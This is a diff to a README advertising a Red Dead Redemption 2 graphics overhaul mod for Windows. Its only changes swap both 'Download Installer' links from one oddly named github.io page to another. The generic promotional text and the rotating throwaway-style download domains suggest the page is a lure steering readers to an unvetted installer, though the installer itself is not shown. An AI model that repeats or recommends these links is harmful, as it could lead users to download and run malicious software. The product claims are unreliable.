@@ -2,7 +2,7 @@
 
 Red Dead Redemption 2 Enhanced Graphics Overhaul is a premium modification suite crafted for the dedicated fans of Red Dead Redemption 2 who seek to push the boundaries of visual fidelity and gameplay immersion on their Windows PCs. Released in 2026, this tool integrates state-of-the-art graphics enhancements, performance optimizations, and subtle gameplay adjustments to redefine your journey through the American frontier. Whether you're revisiting the story or exploring the open world for the first time, this overhaul promises a fresh and breathtaking experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -74,6 +74,6 @@ If you encounter any problems during or after installation, refer to these troub
 
 For the latest version of the Red Dead Redemption 2 Enhanced Graphics Overhaul, visit our official download page. All updates and support information are available there.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This modification is provided free of charge for personal use. We encourage users to report bugs and suggest improvements through the GitHub issues page. Last updated on July 15, 2026, with version 15.07. Copyright © 2026 Enhanced Mods Team. Thank you for choosing our tool to enhance your Red Dead Redemption 2 adventure.
